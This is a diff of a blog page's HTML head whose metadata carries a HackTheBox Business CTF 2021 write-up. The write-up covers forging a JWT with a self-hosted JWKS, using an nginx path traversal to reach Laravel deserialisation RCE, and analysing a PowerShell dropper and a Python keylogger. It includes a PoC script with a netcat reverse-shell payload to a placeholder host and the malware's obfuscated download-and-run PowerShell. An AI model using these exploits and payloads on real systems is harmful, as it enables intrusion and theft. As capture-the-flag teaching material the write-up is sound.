@@ -1,138 +1,153 @@
-<!doctype html><html lang=en>
-<head>
-<title>
-hackthebox business ctf 2021 writeups ::
-#!/bin/note
-— a checkbox uncheckers notepad
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>hackthebox business ctf 2021 writeups | #!/bin/note
 </title>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=keywords content>
 <meta name=description content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score 5th place amongst 374 other teams!
-  The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.
-">
-<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
-<meta name=robots content="noodp">
-<link rel=canonical href=https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/>
-<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
-<link rel=stylesheet href=https://leonjza.github.io/style.css>
-<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
-<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="hackthebox business ctf 2021 writeups">
-<meta name=twitter:description content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score 5th place amongst 374 other teams!
 
-  
-    
-    
-  
+     
 
 
 
-  
-    
-    
-  
+     
 
 
 The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.">
-<meta property="og:title" content="hackthebox business ctf 2021 writeups">
+<meta name=author content="Leon Jacobs">
+<link rel=canonical href=https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://leonjza.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="hackthebox business ctf 2021 writeups">
 <meta property="og:description" content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score 5th place amongst 374 other teams!
 
-  
-    
-    
-  
+     
 
 
 
-  
-    
-    
-  
+     
 
 
 The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.">
 <meta property="og:type" content="article">
-<meta property="og:url" content="https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/"><meta property="article:section" content="posts">
+<meta property="og:url" content="https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/">
+<meta property="og:image" content="https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png"><meta property="article:section" content="posts">
 <meta property="article:published_time" content="2021-07-26T20:19:36+02:00">
 <meta property="article:modified_time" content="2021-07-26T20:19:36+02:00"><meta property="og:site_name" content="#!/bin/note
 ">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png">
+<meta name=twitter:title content="hackthebox business ctf 2021 writeups">
+<meta name=twitter:description content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score 5th place amongst 374 other teams!
+
+     
+
+
+
+     
+
+
+The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"hackthebox business ctf 2021 writeups","item":"https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"hackthebox business ctf 2021 writeups","name":"hackthebox business ctf 2021 writeups","description":"The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score 5th place amongst 374 other teams!\n    The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.\n","keywords":[],"articleBody":"The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score 5th place amongst 374 other teams!\n    The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.\nsolutions We solved 38 out of the 44 challenges, and in this post I will write up some of the ones I solved and found interesting (and have energy for). Unfortunately there’s just too many to write up. Anyways, here goes!\nweb/Emergency  Name: Emergency Category: Web Solves: 148 Rating 2/4 Type: Hosted Description: You’ve been tasked with a pentesting engagement on a hospital management portal, they’ve provided you with a mockup build of the website and they’ve asked you to break their JWT implementation and find a way to login as “admin”.   Register \u0026 login with an account you create.\n  The hint at the top right tells us that if we can login as an admin, we’ll see the flag there. Alright. Once logged in, you get a cookie called auth that looks like a JWT. Decoding that JWT in https://jwt.io/ should reveal the contents.\n  The header contains an interesting field called jku (JWK Set URL) rfc7515. While it shows localhost as the host where it’s hosted, browsing to /.well-known/jwks.json on the target returns:\n{ \"keys\": [ { \"alg\": \"RS256\", \"e\": \"65537\", \"kid\": \"520a8c63-979e-4eec-a898-65ce3a745ec8\", \"kty\": \"RSA\", \"n\": \"23449280482738889245895507291078582838254525255910235513541946393154802290847031214392555552806839273748095037249203247472519486345448369548745790075083645659281193865341488345259094202703775414196359389911734542090336466079214752741074523728561352243375122273569387511394908725295341986379516793366924310398799780225643283052845716171900912034770239943764711206765083616511946700338767541895995886704496171585620589055846475443335026466769449848144773605534420418595157593626717750596511024098107708598027318208503613927895670164235148874382087743531049839528965506663562753195462090371169085974069905692817915834823\", \"use\": \"sig\" } ] } After a little bit of research, the following post detailed an attack where you generate a private key pair and self-host a forged JWKS. Cool!\nSo, generate a keypair:\nopenssl genrsa -out keypair.pem 2048 openssl rsa -in keypair.pem -pubout -out publickey.crt openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key Next, copy the generated publickey.crt and pkcs8.key into https://jwt.io/. This will let you modify the header \u0026 payload data fields of the JWT.\n  Next, we will be hosting our own forged jwks.json file somewhere, but with modified values based on the keypair we generated. So, download the existing /.well-known/jwks.json file, and replace the n and e values with those that are printed using the following script:\nfrom Crypto.PublicKey import RSA fp = open(\"publickey.crt\", \"r\") key = RSA.importKey(fp.read()) fp.close() print(\"n:\", key.n) print(\"e:\", key.e) Note: The script in the writeup mentioned earlier had a call to hex() over key.n and key.e. Our original JWKS had the values represented as base 10 numbers, so I removed the hex() calls.\n❯ python3 get_e_n.py n: 22886710563966340956822048238132141776347204676484958377602992744988500635442815278742328990767865767609438546940854465045592221141397954203230579382142347611722813763792672879573215150525919561564482192751114693804214742783873265392598793348692202182691179725882788918622065704479856089306532862072352692898082459694339750406712440593629584995301975643253487813145992707041196851108235248937454814251203885089087347000107501380883928378711572275375692080813223337418307282792929768098893976202646812829106754027981173056002774293629254416025898967630195044941229996683868958839770197444633515843061313215581697151459 e: 65537 Our updated JWKS now looked like this:\n{ \"keys\":[ { \"alg\":\"RS256\", \"e\":\"65537\", \"kid\":\"408f6673-30b1-4fa9-aa26-5d68337fa975\", \"kty\":\"RSA\", \"n\":\"22886710563966340956822048238132141776347204676484958377602992744988500635442815278742328990767865767609438546940854465045592221141397954203230579382142347611722813763792672879573215150525919561564482192751114693804214742783873265392598793348692202182691179725882788918622065704479856089306532862072352692898082459694339750406712440593629584995301975643253487813145992707041196851108235248937454814251203885089087347000107501380883928378711572275375692080813223337418307282792929768098893976202646812829106754027981173056002774293629254416025898967630195044941229996683868958839770197444633515843061313215581697151459\", \"use\":\"sig\" } ]} Host this file somewhere on the Internet where the challenge box can find it, update the jku URL in https://jwt.io/ to where you are hosting the JWKS and update the existing cookie value to the new, forged one generated by https://jwt.io/. Finally, reload the page and voila!\nFlag: HTB{your_JWTS_4r3_cl41m3d!!}\nweb/Larablog  Name: Larablog Category: Web Solves: 43 Rating 3/4 Type: Hosted Description: I really like nginx, I also really like Laravel. This is why I published a blog post about my secure boilerplate nginx config on my Laravel deployments.   The landing page is a “blog” with one entry where the author speaks about an nginx related configuration.\n  I assumed this was the configuration the server in the challenge had. The nginx configuration file on the page was:\nuser www; pid /run/nginx.pid; error_log /dev/stderr info; events { worker_connections 1024; } http { server_tokens off; log_format docker '$remote_addr $remote_user $status \"$request\" \"$http_referer\" \"$http_user_agent\" '; access_log /dev/stdout docker; charset utf-8; keepalive_timeout 20s; sendfile on; tcp_nopush on; client_max_body_size 2M; include /etc/nginx/mime.types; server { listen 80; server_name _; index index.php; root /www/public; location /assets { alias /www/public/; } location / { try_files $uri $uri/ /index.php?$query_string; location ~ \\.php$ { try_files $uri =404; fastcgi_pass unix:/run/php-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } } } The vuln is not too hard to spot. The assets location is missing a trailing slash which results in a path traversal vulnerability.\nlocation /assets { alias /www/public/; } Reading this post, you can find an excellent description of the “Off-By-Slash” issue and the path traversal problems this creates. Now, given that this challenge was called ‘Larablog’, I assumed it was based on Laravel. Laravel apps should only have their public directory exposed to the Internet. However, when combined with the nginx misconfiguration we can actually gain access to the configuration file that is typically one folder up in a file called .env with a request to http://host/assets../.env.\n❯ curl http://142.93.38.188:31631/assets../.env APP_NAME=blog APP_ENV=production APP_KEY=base64:BWA2LF8I+Xq72HkNO2sZqnaYcC7qwAevd7zBJoI5iEE= APP_DEBUG=true APP_URL=http://localhost ... Excellent! The APP_KEY in a Laravel application is used for anything crypto related, which includes session cookies! This application was setting two cookies, one called blog_session and another randomly generated named one:\nblog_session=eyJpdiI6Ikw4NDE5SVNkSWdES2NmWFVYVHNWbnc9PSIsInZhbHVlIjoidStsWHhuOUtIY2FzZjVQUmQ0SlhuMFd5SUZpdHBFRWNXa1FnSGlPdzZZcGNNTFM5XC9GMnpLNGlYNHhSc3pOcEpJWUdTN2NXaW1TdWZPQnJnZllZamNBPT0iLCJtYWMiOiIxMDgyY2EzZWE4ZjU4NjViYjFiMDcyZDAyMjViMWNkOGEwOTY2OWQ2OGY0N2NjOGNkODE3MDQ4MzBlNmNlYmNmIn0%3D; GblwliF2kVK6ZboaxHD1aJmb9VZ0qmrOvKe7VKtI=eyJpdiI6ImxyYVh3ZGlESjc0Qmd3YVplVExxTUE9PSIsInZhbHVlIjoiWUFpeTh0TjRNOGRDbEFYZ2E5Nm5WeXpDeGNsWkRRVHA5a1FZWmtuR0pkNFBLMVZGTXdPeDdKcWdnNVI5K2l2cFJ4OGxDQTI3NjFEOGVYYkVrTGpSXC9JaEdRYmlYSzFZeGEwRU1RTWQxa05DTzJqMDBJcHRRUUFlY0hYZEpVOW5NM0xxcktyTG5adWlNZ1RNTGlWb2ZadzVCM3pYR1NXc2ppMkUxWXBWUjBCdDVWXC90OFp6ajJ1Z09qdXpVVjMrM0NnQnM3bEVYNnlOSUZZU1BjekJuSmRsSGxjNytzWGh3dHVqSXQ1T0s3YXVMS0FHUzdCSUtxcHNMXC9JWk5iZU5BN2o2Mll3VlJpUkc5bmlhdFhWM3NOblVSVmhBUUdvejF5R0pMV3hvVVJVQ2F5elQxczRGXC94d000VkdicWNzSk4xSkkrQXlJbm1lZnRYUjFZbWpRU291emhCMGluNW95RE01dm9sQ3l6NTdmK1VkM2xqdSszWUNKcGNWV1ZxTnpTZ3NDSXpnMmlDYWNNVGRiVWFHcGREVWJaMWpqRjhJSVNGT1NhUERoVkZBdFwvZjJvMzJhMTEwSnJPUlppK1wvak0xQiIsIm1hYyI6ImVkMmZhZWRlY2Q1YWRhZTIzYWM5OTc4OTAxOGEyM2I5YzhiOWUxMGQ1MzkwNWY5ZTE1ODg3MWVjODU5ZGU0YjIifQ%3D%3D; Because we have the APP_KEY, we can decrypt these cookies. A long time ago I extracted the encryption logic from the Laravel project into a Gist here, but for this challenge I found a python implementation I used here. Updating the values in the script with the current key \u0026 cookies, the decrypted values were:\n❯ python3 decrypt.py blog_session b's:40:\"GblwliF2kVK6ZboaxHD1aJmb9VZ0qmrOvKe7VKtI\";\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10' b's:324:\"{\"data\":\"a:6:{s:6:\\\\\"_token\\\\\";s:40:\\\\\"KyD6rt0laS5gC0NY0TezBFwdW86j7s2yP9A7jOFh\\\\\";s:8:\\\\\"username\\\\\";s:8:\\\\\"guest22e\\\\\";s:5:\\\\\"order\\\\\";s:2:\\\\\"id\\\\\";s:9:\\\\\"direction\\\\\";s:4:\\\\\"desc\\\\\";s:6:\\\\\"_flash\\\\\";a:2:{s:3:\\\\\"old\\\\\";a:0:{}s:3:\\\\\"new\\\\\";a:0:{}}s:9:\\\\\"_previous\\\\\";a:1:{s:3:\\\\\"url\\\\\";s:26:\\\\\"http:\\\\/\\\\/142.93.38.188:31631\\\\\";}}\",\"expires\":1627336043}\";\\x03\\x03\\x03' So, blog_session contained the name of the cookie with the actual PHP serialized() data in it. Neat :)\nAnyways, some older versions of Laravel suffered from a classic PHP deserialisation attack. A more recent post about abusing that can be found here, which does a great job at explaining how the vulnerability works. In our case we were running Laravel 5.5.40 which could be enumerated from the composer.json that we could access thanks to the path traversal at http://142.93.38.188:31631/assets../composer.json:\n{ \"name\": \"laravel/laravel\", \"description\": \"The Laravel Framework.\", \"keywords\": [\"framework\", \"laravel\"], \"license\": \"MIT\", \"type\": \"project\", \"require\": { \"php\": \"^7.1.3\", \"fideloper/proxy\": \"^4.0\", \"laravel/framework\": \"5.5.40\",  \"laravel/tinker\": \"^1.0\" }, ... Knowing that, all we needed was to use the poc.php file from the previous post (with phpggc setup in the path as well), and voila:\nphp $cipher = 'AES-256-CBC'; $app_key = 'base64:BWA2LF8I+Xq72HkNO2sZqnaYcC7qwAevd7zBJoI5iEE='; $chain_name = 'Laravel/RCE6'; $payload = 'system(\\'nc MYHOST-IP 4444 -e /bin/sh\\');'; // Use PHPGGC to generate the gadget chain $chain = shell_exec('./phpggc/phpggc '.$chain_name.' \"'.$payload.'\"'); // Key can be stored as base64 or string. if( explode(\":\", $app_key)[0] === 'base64' ) { $app_key = base64_decode(explode(':', $app_key)[1]); } // Create cookie $iv = random_bytes(openssl_cipher_iv_length($cipher)); $value = \\openssl_encrypt($chain, $cipher, $app_key, 0, $iv); $iv = base64_encode($iv); $mac = hash_hmac('sha256', $iv.$value, $app_key); $json = json_encode(compact('iv', 'value', 'mac')); // Print the results die(urlencode(base64_encode($json)) . PHP_EOL); Running that would generate a cookie such the following:\n❯ php poc.php eyJpdiI6Ijc2cjU4S0VHcmFqUnB5YThZZkM1c2c9PSIsInZhbHVlIjoibU9SM1ZqUTY4d0ZWcVAzWHQyMEEwanVvVW5EdEpRcXpLZnJ4Z1Rrd3piVGgzc2FEWFJyTGhGZDBYM0pDTld6bWtFVHBDNzRWWTBLRVdCMzBXVGxyU1pBVmNkVWZ6NGExR2dUTFM5c2N6Nlwvak9BN3JhT0FxNkhYcGZmU1wvVmllaXNvSmdpUVwvOWVRTnlVR3Nqbk0wNG56ZDBoSGxvdWd5Q1FTZkZNQitFSWpsa29xVWVxTGlqOWYwc2dtcWkySXZ1S1VaMVU2MTJQVkNsdHFBSXpRUnZcL0xDNENZOGZpRkYxOTRPWml0MUJYZCthNVNVemM4MHZmRE1kNzJvSUNDU2V4SXpsWlI1eU5JNlBlWGt4UUdSeHVlaWxWazlZTjQwNlJFSE5ZRmJoRUR5VlRhNXA1cXd0bmVucFlicWRUSU1ja2U5S0Z0OVRJOVRuZHRkenFqMHluejhubEFON1EzTlBmV0pHSG5FbTYrRVB2SFwvWTFtN2xNQU9GcVYwR2FSaHBmQmxTN1pmZmhVU0Jua3plZmE0Ym53QjZYNHNUV284N3lhQ0plbURINXoreitzdllOZlJ3MjVLUzlCOE9GUHJPZFhoY2sxR1ltXC85V0Qwcnl5Uk9KRTNPSTQ5aFh2UHkxbjZlTEpGd25yeFg0T3FhbUpQMWVUZHlKcHQ0cWNYa1hwak93OFE1ZTJ6aEV2ZHNPRnlaWVllYlY4QjVwdW1ZdkdoSDJ2dVJuRlBWWHlBV1wvWHBJbllNQ1dKUlVZdlpIMXFYVzdOWStPZms1U1pEUnFpdXN4VFQreUc5TmpPVnFpbDl3RE1CRTJMYVhycDU3K1FMa0crcVBjVDFJVVZMdXlDQUgrbUFQUndEdnJcLzFyaTBqUlQxZU52K2g5Q2lldzUxUDBZOXRWSnVuU1FHWG9ERklYZUN3UHFUQVpcL0xVaVYyVTdvZlhha1wvaEF4cElHRHRLS0hRcUhRcEl0ZTFCQUN1cUd6dzhkeG5zK0hFV2lSMEV4aE9HTHFXTlpQWExkNiIsIm1hYyI6ImI1NWFlNWM3MDE2MTk3NTgzZGYwNmI3NjUyOWUzNWU2NTBiNmQ5NWZjZWU5ZGNmNjNiNjU0ZDkxODUxMWY5NzIifQ%3D%3D With your netcat listener and a modified request in your burp you should get a shell to cat the flag from! Alternatively, a one liner would look something like this (note the inline execution of $(php poc.php)):\ncurl -i -s -k -X $'GET' \\  Py venv3 -H $'Host: 142.93.38.188:31631' \\  -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0' \\  -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \\  -H $'Accept-Language: en-US,en;q=0.5' \\  -H $'Accept-Encoding: gzip, deflate' \\  -H $'Connection: close' \\  -H $'Upgrade-Insecure-Requests: 1' \\  -H $'Cache-Control: max-age=0' \\  -b \"blog_session=eyJpdiI6Ikg3bmhiWm5iSFpRK29jTjU5VDNjSGc9PSIsInZhbHVlIjoiZGswbFBGMlFSclBOOFQ1Q1J1c0dXaEtpZGtYaFJHck5vaDBUd3lRb3NXalBKMFJFTmJmY3VSSTF0TDlBMjdyZlFSZXdqR1RueVZ4REIwTkFhRFhHWHc9PSIsIm1hYyI6ImJmY2VkZmQxYmE2YTMyZDY5OGVmNDAwMjA5MzQzODY2ZTY5MzY1YWUxMDZhMzExYTIwYTkyOTI2MzE3YTJmZDQifQ%3D%3D; CHUy1XJywSReivL5QDrK8y3MhKPuH0JNbJ7kk2xB=$(php poc.php)\" \\  $'http://142.93.38.188:31631/' Flag: HTB{0ff_by_sl4sh_pwn4g3}\nforensics/DFIR  Name: DFIR Category: forensics Solves: 29 Rating 2/4 Type: ~8GB OVA download Description: I have always heard stories about blue windows popping up during the startup and what that means but I never though it could happen to me. Please have a look and let me know if you find something. The user’s password is: Passw0rd! http://138.68.175.191/businessctf/dfir/   This challenge being an OVA download started off really frustrating. In fact, somehow I managed to bork my local VMWare trying to import it, and when it finally did come up, the VM just never booted. So, I finally downloaded VirtualBox and with some patience, got it to boot. :( The VM would randomly lock up for a few seconds under load, or do strange things like lock up left click as if I’m holding down the mouse button. This made for an… interesting computering experience… Anyways!\nThe challenge description said something about windows popping up at start up, and ‘lo and behold, a PowerShell window appeared during the excruciatingly slow boot of the VM. I figured the best way I would find out what may be causing that was to use the Sysinternals Autoruns tool.\nAfter not too long, I spotted an oddly named Scheduled Task that runs PowerShell:\n  The arguments to the invocation of PowerShell in that tiny, tiny box were:\n-w hidden -ExecutionPolicy Bypass -nop -NoExit -C Write-host 'Windows update ready'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\1X90wOyH).Q4josQ44))); Looked like it was reading something from the registry. Being the lazy person I am, I reused the code to get me the value it was reading:\n  This time round we got some lightly obfuscated PowerShell.\n${P`ATH} = (((\"{9}{2}{1}{8}{5}{6}{10}{4}{3}{7}{0}{11}\" -f'ost.','gramD','Pro','svc','ndows{0}','ta{','0','h','a','C:{0}','}wi','exe')) -f [chAR]92);${e`XISTs} = .(\"{1}{0}{2}\" -f 'est-Pa','T','th') -Path ${p`AtH} -PathType (\"{1}{0}\" -f 'eaf','L');${Par`T1} = \"HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_\";if ( ${exi`stS} ){ \u0026(\"{3}{2}{1}{0}\"-f 'ess','oc','t-Pr','Star') ${pa`Th}}else{\u0026(\"{1}{0}\" -f 'ir','mkd') (((\"{3}{5}{4}{0}{1}{2}\" -f 'Datadt','Qw','indows','C:dtQP','m','rogra')).\"rePl`AcE\"(([CHAr]100+[CHAr]116+[CHAr]81),'\\'));\u0026(\"{1}{4}{3}{0}{2}\" -f'eb','I','Request','voke-W','n') -Uri (\"{2}{0}{8}{3}{1}{6}{5}{4}{7}\" -f'ttps://win','eupdater','h','owsliv','ho','c','.com/sv','st.exe','d') -OutFile ${PA`TH};.(\"{3}{2}{1}{0}\" -f 'Process','-','rt','Sta') ${p`ATh}} Cleaning that up a bit, we can see that a file in C:\\ProgramData\\windows\\svchost.exe was being run. If it did not exist, it would have been downloaded from somewhere. For the most part, I just grabbed parts of the script and evaluated them in the PowerShell prompt to see the output to determine values:\n# C:\\ProgramData\\windows\\svchost.exe ${P`ATH} = (((\"{9}{2}{1}{8}{5}{6}{10}{4}{3}{7}{0}{11}\" -f'ost.','gramD','Pro','svc','ndows{0}','ta{','0','h','a','C:{0}','}wi','exe')) -f [chAR]92); # True | testing for upper path ${e`XISTs} = .(\"{1}{0}{2}\" -f 'est-Pa','T','th') -Path ${p`AtH} -PathType (\"{1}{0}\" -f 'eaf','L'); ${Par`T1} = \"HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_\"; if ( ${exi`stS} ){ \u0026(\"{3}{2}{1}{0}\"-f 'ess','oc','t-Pr','Star') ${pa`Th} }else{ # mkdir c:\\programdata\\windows? \u0026(\"{1}{0}\" -f 'ir','mkd') (((\"{3}{5}{4}{0}{1}{2}\" -f 'Datadt','Qw','indows','C:dtQP','m','rogra')).\"rePl`AcE\"(([CHAr]100+[CHAr]116+[CHAr]81),'\\')); \u0026(\"{1}{4}{3}{0}{2}\" -f'eb','I','Request','voke-W','n') -Uri (\"{2}{0}{8}{3}{1}{6}{5}{4}{7}\" -f'ttps://win','eupdater','h','owsliv','ho','c','.com/sv','st.exe','d') -OutFile ${PA`TH}; .(\"{3}{2}{1}{0}\" -f 'Process','-','rt','Sta') ${p`ATh} } This snippet also gave us what looked like the first part of the flag: HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_. Neat, looks like there is a part 2.\nFrom here, focus shifted to that svchost.exe binary that lived in C:\\ProgramData\\Windows. Just running it resulted in no output, both by double clicking or running it in cmd.exe. I dropped the binary in Cutter, but it was pretty big.\n  After spending some time reversing, trying to make sense of the binary, I did come across some references to a Python VM. Geez.\n  At this point I figured surely, for a 2/4 difficulty challenge I don’t have to dive this deep? So instead, I opted for some good ‘ol procmon! I renamed the binary in the ProgramData folder to svchost1.exe to make filtering a little easier.\n  This time round I could see the Python usage a lot faster, with the added bonus of an idea where the runtime was located; C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI5882. Many calls to read cryptography related (by name) files ending in .pyd were also seen.\nEach invocation of svchost.exe (or svchost1.exe in my renamed case) would have a new folder created in the Temp\\ directory with a similar _MEI... format. Anyways, with this folder in mind I copied out the files onto my host for investigation. I was a little worried here as I know it’s possible to obtain source code from Python’s .pyc files, but I have not seen .pyd’s before.\nA lot of time later, I kind of gave up on the hope of getting source code. Drat. It helped knowing that there were artifacts coming from the binary itself, so I did not go back to trying to reverse the binary further.\nFor plan B, I opted to get API Monitor running. Even if a Python VM was used, calls out to the Windows API would still be interesting to see with some argument data. And oh boy was it interesting. It took me a while to understand the API Monitor workflow, but before long I was able to get svchost.exe loaded and running.\nThe first major observation was that not long after the process starts up, a second thread boots up. The first thread can be seen reading the python37.dll, where after a while DllMain is called. My hypothesis at this point was that the actual logic being executed would be in the second thread, with the first just being a bootstrap phase for the Python VM.\nThe second observation was in the second thread, where a file at C:\\Users\\IEUser\\AppData\\Roaming/anVzdGFuW1l.txt was being referenced.\n  This was a new file that I had not previously discovered, so I went looking for what’s inside!\nb'sm+3e2dfsjht3Y2BgddPVlGLMtYSLuXAvcuTwGwVQQYx7mn0QZ5JxNKYBBAaLgrYeoe3OOMRv9Gm9amegVnMZfxy0Qm5OTccBs0ldLsTj8uiuHAzvT6Lo6DdSWkYjaSad0tS1TT7g3crzpLqGm3BLG2owBvbftU3uTeItXKey/KPUjgaDWMbUA9c0/jIzNM=' b's3Zs18MrewFI6qjX6Oa9+jF8ugOEwdzqtcnVRRskAnXrwQ9UataGcUduhwFXLCARsqw3NaK0Xv7e69xbcj0z2To3k4D7sIw=' b'tEcxPY3ltJsHDRsDsg==' b'tV+IdIZdzTwRbg7M' b'tjre2wAnnPYsV9Fi' b't8DXhB0vUlDETcoV' b'uA9TSu+WUuoJqUP6' b'uZ3bfrTM8sNt15HB' b'sRBm6KWZigygdqvPZw==' ... Lots of strings that appear to be base64 encoded, with a Python Bytes Object b'' in front of them. Seeing this with the crypto related files read in the earlier Procmon output made it pretty clear that these were encrypted. But how? And what are they?\nI can bore you with the details of the next section, but I’ll skip to the chase. In my clicking around, wondering about what’s going on and what my next move could be, I notice the following in API Monitor.\n  A call to MapVirtualKeyExW!? A keylogger!? I tested a few things to make sure I wasn’t going crazy, but yeah, this app was capturing keystrokes. Ok! Looking back at anVzdGFuW1l.txt, I noticed that after each press of the ENTER key, a new encrypted line would get written to the file (I used baretail to tail the file as I pressed keys). This didn’t get me any closer to the solve yet, but at least I have a much better idea what the application was doing, just by watching Windows API calls. Pretty cool!\nEventually I wondered how they could have built the application, and it being Python and all I recalled a thing called Pyinstaller. Essentially, you can create Windows executables from Python projects. Next, I wondered if there were tools that could extract objects/code from a Pyinstaller generated exe (assuming a bit that this was how svchost.exe was built), and came across a project called pyinstxtractor. I quickly set that up and ran it. This time round I had more python files than those I found in the _MEI5882 temp folder! In fact, there were some .pyc files now!\n❯ cd svchost.exe_extracted ❯ ll Permissions Size User Date Modified Name .rw-r--r-- 95k leonjza 25 Jul 14:56 _bz2.pyd .rw-r--r-- 133k leonjza 25 Jul 14:56 _ctypes.pyd .rw-r--r-- 39k leonjza 25 Jul 14:56 _hashlib.pyd .rw-r--r-- 176k leonjza 25 Jul 14:56 _lzma.pyd .rw-r--r-- 28k leonjza 25 Jul 14:56 _queue.pyd .rw-r--r-- 77k leonjza 25 Jul 14:56 _socket.pyd .rw-r--r-- 121k leonjza 25 Jul 14:56 _ssl.pyd .rw-r--r-- 778k leonjza 25 Jul 14:56 base_library.zip drwxr-xr-x - leonjza 25 